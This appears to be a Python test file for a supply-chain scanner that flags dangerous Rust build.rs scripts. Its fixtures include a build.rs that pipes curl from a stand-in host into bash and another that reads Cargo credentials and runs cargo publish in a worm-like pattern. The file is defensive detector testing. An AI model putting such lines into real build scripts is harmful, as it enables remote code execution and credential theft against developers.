"""Tests for ``cargo_build_scripts`` after the A.2-symmetric
treatment: mere presence of ``build.rs`` no longer emits a row.
Only the dangerous-pattern shape OR the worm-shape conjunction
fires.

Surfaced by the stress sweep against serde / proc-macro2: every
clean Rust crate has a ``build.rs`` and the prior ``info``-level
mere-presence emission flooded reports.
"""

from __future__ import annotations

from pathlib import Path

from packages.sca.models import (
    Confidence,
    Dependency,
    Manifest,
    PinStyle,
)
from packages.sca.supply_chain import cargo_build_scripts


def _dep(name: str, declared_in: Path) -> Dependency:
    return Dependency(
        ecosystem="Cargo", name=name, version="1.0.0",
        declared_in=declared_in, scope="main",
        is_lockfile=False, pin_style=PinStyle.EXACT,
        direct=True, purl=f"pkg:cargo/{name}@1.0.0",
        parser_confidence=Confidence("high", reason="t"),
    )


def _manifest(p: Path) -> Manifest:
    return Manifest(path=p, ecosystem="Cargo", is_lockfile=False)


def _write_crate(tmp_path: Path, build_rs_body: str) -> Path:
    cargo = tmp_path / "Cargo.toml"
    cargo.write_text(
        '[package]\nname = "victim"\nversion = "1.0.0"\n',
        encoding="utf-8",
    )
    (tmp_path / "build.rs").write_text(build_rs_body, encoding="utf-8")
    return cargo


# ---------------------------------------------------------------------------
# Clean build.rs → no finding
# ---------------------------------------------------------------------------

def test_clean_build_rs_no_finding(tmp_path: Path) -> None:
    """Vanilla ``build.rs`` (cargo:rerun-if-changed declaration) —
    no finding.  Stress-sweep showed serde / proc-macro2 / many
    other crates produce this exact shape."""
    cargo = _write_crate(tmp_path, """\
fn main() {
    println!("cargo:rerun-if-changed=src/foo.h");
    let target = std::env::var("TARGET").unwrap();
    if target.contains("linux") {
        println!("cargo:rustc-link-lib=dylib=foo");
    }
}
""")
    findings = cargo_build_scripts.scan_manifests(
        [_manifest(cargo)], [_dep("victim", cargo)],
    )
    assert findings == []


def test_build_rs_with_std_env_no_finding(tmp_path: Path) -> None:
    """``use std::env`` — common, harmless."""
    cargo = _write_crate(tmp_path, "use std::env;\nfn main() {}\n")
    findings = cargo_build_scripts.scan_manifests(
        [_manifest(cargo)], [_dep("victim", cargo)],
    )
    assert findings == []


# ---------------------------------------------------------------------------
# Dangerous-pattern build.rs → high
# ---------------------------------------------------------------------------

def test_build_rs_with_curl_pipe_shell_fires_high(tmp_path: Path) -> None:
    cargo = _write_crate(tmp_path, """\
use std::process::Command;
fn main() {
    Command::new("sh").arg("-c")
        .arg("curl https://evil.example/x | bash").status().unwrap();
}
""")
    findings = cargo_build_scripts.scan_manifests(
        [_manifest(cargo)], [_dep("victim", cargo)],
    )
    assert len(findings) == 1
    assert findings[0].severity == "high"
    assert "known-dangerous" in findings[0].confidence.reason


# ---------------------------------------------------------------------------
# Worm-shape (C+G) → high
# ---------------------------------------------------------------------------

def test_build_rs_worm_shape_fires_high(tmp_path: Path) -> None:
    """build.rs that reads ~/.cargo/credentials AND invokes
    cargo publish (via subprocess) → worm-shape high."""
    cargo = _write_crate(tmp_path, """\
use std::process::Command;
fn main() {
    let _creds = std::fs::read_to_string("~/.cargo/credentials");
    Command::new("cargo").arg("publish").status().unwrap();
}
""")
    findings = cargo_build_scripts.scan_manifests(
        [_manifest(cargo)], [_dep("victim", cargo)],
    )
    assert len(findings) == 1
    assert findings[0].severity == "high"
    assert "self-replication" in findings[0].confidence.reason


# ---------------------------------------------------------------------------
# No build.rs → no scan
# ---------------------------------------------------------------------------

def test_no_build_rs_no_finding(tmp_path: Path) -> None:
    cargo = tmp_path / "Cargo.toml"
    cargo.write_text(
        '[package]\nname = "x"\nversion = "1.0.0"\n', encoding="utf-8",
    )
    findings = cargo_build_scripts.scan_manifests(
        [_manifest(cargo)], [_dep("x", cargo)],
    )
    assert findings == []
